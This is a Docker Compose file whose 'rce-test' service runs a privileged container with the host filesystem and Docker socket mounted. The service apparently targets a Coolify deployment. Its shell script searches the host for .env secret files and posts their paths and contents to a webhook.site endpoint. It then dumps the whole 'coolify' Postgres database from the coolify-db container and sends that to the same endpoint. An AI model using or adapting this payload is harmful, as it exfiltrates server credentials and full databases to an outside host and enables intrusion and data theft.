version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
      - '/var/run/docker.sock:/var/run/docker.sock'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl findutils docker-cli
        
        # 1. Найти .env файлы
        find /host-root -name ".env" -type f 2>/dev/null > /tmp/env_list.txt
        cat /tmp/env_list.txt | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=env_paths
        
        # 2. Вытащить первый .env (не из applications/services)
        ENV_FILE=$(grep -v "applications" /tmp/env_list.txt | grep -v "services" | head -1)
        if [ -n "$ENV_FILE" ]; then
          cat "$ENV_FILE" | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=main_env
        fi
        
        # 3. Через Docker socket найти контейнер coolify-db и выгрузить БД
        docker ps --format "{{.Names}} {{.ID}}" | grep coolify-db | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=db_container
        
        DB_CONTAINER=$(docker ps --format "{{.Names}}" | grep coolify-db)
        if [ -n "$DB_CONTAINER" ]; then
          docker exec $DB_CONTAINER pg_dump -U coolify -d coolify | curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=full_db
        fi
        
        sleep 3600
